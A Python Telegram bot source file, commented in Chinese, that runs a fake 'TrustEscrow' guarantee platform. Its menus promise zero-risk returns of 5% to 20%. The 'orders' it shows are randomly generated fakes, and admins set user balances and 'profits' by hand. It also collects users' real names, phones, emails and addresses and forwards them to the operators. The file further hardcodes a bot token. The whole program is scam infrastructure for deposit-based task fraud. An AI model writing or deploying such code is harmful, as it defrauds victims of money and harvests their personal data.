# -*- coding: utf-8 -*-
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import re
import random
import time
import threading
import os
from flask import Flask

# ===================== 核心配置（直接填你的Token，不用环境变量） =====================
BOT_TOKEN = "8727191543:AAF0rax78kPycp0MqahZgpjqdrrtJQbjj_I"
ADMIN_IDS = [8781082053, 8256055083]
VIRTUAL_ORDER_REFRESH_SECONDS = 120
bot = telebot.TeleBot(BOT_TOKEN)

# ===================== 防Railway杀进程：假HTTP服务（关键！） =====================
app = Flask(__name__)
@app.route('/')
def home():
    return "Bot is running!", 200

def run_flask():
    port = int(os.getenv("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# ===================== 虚拟订单 =====================
virtual_orders = []
def refresh_virtual_orders():
    global virtual_orders
    while True:
        virtual_orders = []
        for i in range(6):
            vid = 80000 + i
            amt = round(random.uniform(10, 100), 2)
            virtual_orders.append({"id": vid, "amount": amt})
        time.sleep(VIRTUAL_ORDER_REFRESH_SECONDS)

# ===================== 双语文案 =====================
TEXT = {
    "zh": {
        "home": """🏆 TrustEscrow 頂級擔保平台
安全交易 · 穩定收益 · 零風險保障

✅ 5年零詐騙實績
✅ 專業中間人墊資
✅ 資金全程託管
✅ 搶單5%穩定收益
✅ 派單15%-20%高額回報

客服：@fcff88""",
        "reg_form": """📝 入駐擔保申請
請依序填寫真實信息：
1. 真實姓名
2. 聯絡電話
3. 電子信箱
4. 居住地址
5. 推薦人ID""",
        "reg_success": "✅ 入駐申請已提交，等待管理員審核",
        "reg_error": "❌ 格式錯誤，請按要求一次性發送完整5項信息",
        "profile": """👤 個人中心
🆔 用戶ID：{}
💰 餘額：{:.2f} USDT
📌 狀態：{}

⏳ 未完成訂單：
{}
✅ 已完成訂單：
{}""",
        "grab": """🚀 搶單大廳（每2分鐘自動刷新）
點擊「搶單」按鈕獲取真實訂單：

{}""",
        "grab_success": "✅ 搶單成功，請接單",
        "grab_already_gone": "❌ 訂單已被搶走",
        "deposit": """💰 儲值 & 提現
請聯繫官方客服：➡️ @fcff88""",
        "record": """📜 擔保記錄
{}""",
        "account_detail": """📋 賬號明細
🆔 用戶ID：{}
👤 真實姓名：{}
📞 聯絡電話：{}
📧 電子信箱：{}
🏠 居住地址：{}
👥 推薦人ID：{}
💰 當前餘額：{:.2f} USDT
📌 審核狀態：{}""",
        "status_wait": "待接單",
        "status_doing": "已接單",
        "status_done": "已完成",
        "accept_success": "✅ 接單成功，已扣除金額",
        "not_enough": "❌ 餘額不足",
        "not_verified": "❌ 未通過審核",
        "no_detail": "❌ 你尚未填寫入駐信息",
        "btn_back": "返回首頁",
        "btn_accept": "接單",
        "btn_grab": "搶單"
    }
}

# ===================== 数据存储 =====================
user_lang = {}
user_balance = {}
user_verify = {}
user_info = {}
orders = {}
order_id = 1
last_msg = {}
user_applying = {}

# ===================== 菜单生成 =====================
def main_menu(user_id):
    m = InlineKeyboardMarkup(row_width=2)
    m.add(
        InlineKeyboardButton("入駐擔保", callback_data="reg"),
        InlineKeyboardButton("個人中心", callback_data="profile"),
        InlineKeyboardButton("賬號明細", callback_data="detail"),
        InlineKeyboardButton("搶單大廳", callback_data="grab"),
        InlineKeyboardButton("儲值提現", callback_data="deposit"),
        InlineKeyboardButton("擔保記錄", callback_data="record"),
    )
    return m

def back_menu():
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("返回首頁", callback_data="home"))
    return m

def accept_btn(oid):
    m = InlineKeyboardMarkup()
    m.add(InlineKeyboardButton("接單", callback_data=f"acc_{oid}"))
    m.add(InlineKeyboardButton("返回", callback_data="profile"))
    return m

# ===================== 通知管理员 =====================
def notify_admins(text):
    for admin in ADMIN_IDS:
        try:
            bot.send_message(admin, text)
        except Exception as e:
            print(f"通知管理员失败: {e}")
            continue

# ===================== /start 启动 =====================
@bot.message_handler(commands=["start"])
def start(msg):
    u = msg.from_user.id
    user_lang[u] = "zh"
    user_balance.setdefault(u, 0.0)
    user_verify.setdefault(u, 0)
    user_info.setdefault(u, {})
    user_applying[u] = False
    sent = bot.send_message(u, TEXT["zh"]["home"], reply_markup=main_menu(u))
    last_msg[u] = sent.message_id

# ===================== 按钮回调 =====================
@bot.callback_query_handler(func=lambda c: True)
def callback(c):
    u = c.from_user.id
    mid = c.message.message_id
    cid = c.message.chat.id
    last_msg[u] = mid

    try:
        if c.data == "home":
            bot.edit_message_text(TEXT["zh"]["home"], cid, mid, reply_markup=main_menu(u))

        elif c.data == "reg":
            if user_verify.get(u, 0) != 0:
                bot.answer_callback_query(c.id, "已提交或已通過", show_alert=True)
                return
            user_applying[u] = True
            bot.edit_message_text(TEXT["zh"]["reg_form"], cid, mid, reply_markup=back_menu())

        elif c.data == "detail":
            info = user_info.get(u, {})
            if not info:
                bot.edit_message_text(TEXT["zh"]["no_detail"], cid, mid, reply_markup=back_menu())
                return
            name = info.get("name", "-")
            phone = info.get("phone", "-")
            email = info.get("email", "-")
            addr = info.get("addr", "-")
            ref = info.get("ref", "-")
            bal = user_balance.get(u, 0)
            v = user_verify.get(u, 0)
            status = "未申請" if v == 0 else "審核中" if v == 1 else "已通過"
            text = TEXT["zh"]["account_detail"].format(u, name, phone, email, addr, ref, bal, status)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu())

        elif c.data == "profile":
            pending = []
            completed = []
            for oid, o in orders.items():
                if o["user"] == u:
                    typ = "派單" if o["type"] == "assign" else "搶單"
                    s = TEXT["zh"]["status_done"] if o["status"] == 2 else TEXT["zh"]["status_doing"] if o["status"] == 1 else TEXT["zh"]["status_wait"]
                    line = f"• #{oid} {typ} {o['amount']} USDT | {s}"
                    if o["status"] == 2:
                        completed.append(line)
                    else:
                        pending.append(line)
            v = user_verify.get(u, 0)
            status = "未申請" if v == 0 else "審核中" if v == 1 else "已通過"
            p_text = "\n".join(pending) if pending else "無"
            c_text = "\n".join(completed) if completed else "無"
            text = TEXT["zh"]["profile"].format(u, user_balance.get(u, 0), status, p_text, c_text)
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu())

        elif c.data == "grab":
            if user_verify.get(u, 0) != 2:
                bot.answer_callback_query(c.id, TEXT["zh"]["not_verified"], show_alert=True)
                return
            items = []
            m = InlineKeyboardMarkup(row_width=1)
            for vo in virtual_orders:
                items.append(f"🔹 訂單 {vo['id']} ｜ {vo['amount']} USDT")
                m.add(InlineKeyboardButton(f"搶單 {vo['id']}", callback_data=f"grab_item_{vo['id']}"))
            m.add(InlineKeyboardButton("返回", callback_data="home"))
            text = TEXT["zh"]["grab"].format("\n".join(items))
            bot.edit_message_text(text, cid, mid, reply_markup=m)

        elif c.data.startswith("grab_item_"):
            if user_verify.get(u, 0) != 2:
                bot.answer_callback_query(c.id, TEXT["zh"]["not_verified"], show_alert=True)
                return
            vid = int(c.data.split("_")[-1])
            hit = next((x for x in virtual_orders if x["id"] == vid), None)
            if not hit:
                bot.send_message(u, TEXT["zh"]["grab_already_gone"])
                return
            global order_id
            oid = order_id
            order_id += 1
            orders[oid] = {"user": u, "amount": hit["amount"], "type": "grab", "status": 0}
            bot.edit_message_text(TEXT["zh"]["grab_success"], cid, mid, reply_markup=accept_btn(oid))

        elif c.data.startswith("acc_"):
            oid = int(c.data.split("_")[1])
            o = orders.get(oid)
            if not o or o["user"] != u or o["status"] != 0:
                bot.answer_callback_query(c.id, "❌ 無效訂單", show_alert=True)
                return
            if user_balance.get(u, 0) < o["amount"]:
                bot.answer_callback_query(c.id, TEXT["zh"]["not_enough"], show_alert=True)
                return
            user_balance[u] -= o["amount"]
            o["status"] = 1
            bot.edit_message_text(TEXT["zh"]["accept_success"], cid, mid, reply_markup=back_menu())

        elif c.data == "deposit":
            bot.edit_message_text(TEXT["zh"]["deposit"], cid, mid, reply_markup=back_menu())

        elif c.data == "record":
            lines = []
            for oid, o in orders.items():
                if o["user"] == u:
                    s = TEXT["zh"]["status_done"] if o["status"] == 2 else TEXT["zh"]["status_doing"] if o["status"] == 1 else TEXT["zh"]["status_wait"]
                    typ = "派單" if o["type"] == "assign" else "搶單"
                    lines.append(f"• #{oid} {typ} {o['amount']} USDT | {s}")
            text = TEXT["zh"]["record"].format("\n".join(lines) if lines else "無記錄")
            bot.edit_message_text(text, cid, mid, reply_markup=back_menu())

        bot.answer_callback_query(c.id)
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(c.id)

# ===================== 用户消息处理（入驻申请） =====================
@bot.message_handler(func=lambda m: m.from_user.id not in ADMIN_IDS)
def user_input(msg):
    u = msg.from_user.id
    txt = msg.text.strip()

    user_applying.setdefault(u, False)
    if not user_applying[u]:
        return

    pattern = r"1\.?\s*真實姓名\s*(.+?)\s*2\.?\s*聯絡電話\s*(.+?)\s*3\.?\s*電子信箱\s*(.+?)\s*4\.?\s*居住地址\s*(.+?)\s*5\.?\s*推薦人ID\s*(.+)"
    match = re.search(pattern, txt, re.DOTALL)

    if match:
        name = match.group(1).strip()
        phone = match.group(2).strip()
        email = match.group(3).strip()
        addr = match.group(4).strip()
        ref = match.group(5).strip()

        user_info[u] = {
            "name": name,
            "phone": phone,
            "email": email,
            "addr": addr,
            "ref": ref
        }
        user_verify[u] = 1
        user_applying[u] = False

        notify_admins(f"""📥 新入駐申請
用戶ID：{u}
姓名：{name}
電話：{phone}
郵箱：{email}
地址：{addr}
推薦人：{ref}""")

        mid = last_msg.get(u, None)
        if mid:
            bot.edit_message_text(TEXT["zh"]["reg_success"], msg.chat.id, mid, reply_markup=main_menu(u))
        else:
            sent = bot.send_message(msg.chat.id, TEXT["zh"]["reg_success"], reply_markup=main_menu(u))
            last_msg[u] = sent.message_id
    else:
        mid = last_msg.get(u, None)
        if mid:
            bot.edit_message_text(TEXT["zh"]["reg_error"], msg.chat.id, mid, reply_markup=back_menu())
        else:
            sent = bot.send_message(msg.chat.id, TEXT["zh"]["reg_error"], reply_markup=back_menu())
            last_msg[u] = sent.message_id

# ===================== 管理员命令 =====================
@bot.message_handler(func=lambda m: m.from_user.id in ADMIN_IDS)
def admin_cmd(msg):
    u = msg.from_user.id
    txt = msg.text.strip()
    arr = txt.split()

    try:
        # 1. 通过用户
        if len(arr) >= 2 and arr[0] in ["审核通过", "通过审核", "通过"]:
            target = int(arr[1])
            user_verify[target] = 2
            bot.send_message(u, f"✅ 已成功通過用戶 {target} 的審核")
            return

        # 2. 查ID 用户ID → 查看用户信息
        if len(arr) >= 2 and arr[0] == "查ID":
            target = int(arr[1])
            info = user_info.get(target, {})
            bal = user_balance.get(target, 0.0)
            v = user_verify.get(target, 0)
            status = ["未申請", "審核中", "已通過"][v] if v in [0,1,2] else "未知"
            text = f"📋 用戶信息｜ID：{target}\n"
            text += f"姓名：{info.get('name', '-')}\n"
            text += f"電話：{info.get('phone', '-')}\n"
            text += f"郵箱：{info.get('email', '-')}\n"
            text += f"地址：{info.get('addr', '-')}\n"
            text += f"推薦人：{info.get('ref', '-')}\n"
            text += f"餘額：{bal:.2f} USDT\n"
            text += f"狀態：{status}"
            bot.send_message(u, text)
            return

        # 3. +U ID 金额
        if txt.startswith("+U "):
            parts = txt.split()
            if len(parts) == 3:
                uid = int(parts[1])
                amt = float(parts[2])
                user_balance[uid] = user_balance.get(uid, 0.0) + amt
                bot.send_message(u, f"✅ +{amt:.2f} USDT → {uid}｜餘額：{user_balance[uid]:.2f}")
            return

        # 4. -U ID 金额
        if txt.startswith("-U "):
            parts = txt.split()
            if len(parts) == 3:
                uid = int(parts[1])
                amt = float(parts[2])
                current = user_balance.get(uid, 0.0)
                user_balance[uid] = max(0.0, current - amt)
                bot.send_message(u, f"✅ -{amt:.2f} USDT → {uid}｜餘額：{user_balance[uid]:.2f}")
            return

        # 5. 派单 ID 金额
        if arr[0] == "派单" and len(arr) == 3:
            target = int(arr[1])
            amt = float(arr[2])
            global order_id
            oid = order_id
            order_id += 1
            orders[oid] = {"user": target, "amount": amt, "type": "assign", "status": 0}
            bot.send_message(u, f"✅ 派單成功｜訂單 {oid} {amt} USDT → {target}")
            return

        # 6. 完成 订单号
        if arr[0] == "完成" and len(arr) == 2:
            oid = int(arr[1])
            o = orders.get(oid)
            if not o:
                bot.send_message(u, "❌ 訂單不存在")
                return
            o["status"] = 2
            profit = o["amount"] * (random.uniform(0.15, 0.20) if o["type"] == "assign" else 0.05)
            user_balance[o["user"]] += o["amount"] + profit
            bot.send_message(u, f"✅ 訂單 {oid} 已完成，利潤已發放")
            return

        bot.send_message(u, "❌ 指令格式：\n通过 ID\n查ID ID\n+U ID 金额\n-U ID 金额\n派单 ID 金额\n完成 订单号")
    except Exception as e:
        print(f"Admin cmd error: {e}")
        bot.send_message(u, "❌ 指令格式錯誤")

# ===================== 启动机器人 =====================
if __name__ == "__main__":
    # 启动虚拟订单刷新线程
    threading.Thread(target=refresh_virtual_orders, daemon=True).start()
    # 启动Flask防杀进程线程
    threading.Thread(target=run_flask, daemon=True).start()
    print("✅ 機器人啟動成功，Railway防殺進程已開啟")
    bot.infinity_polling()
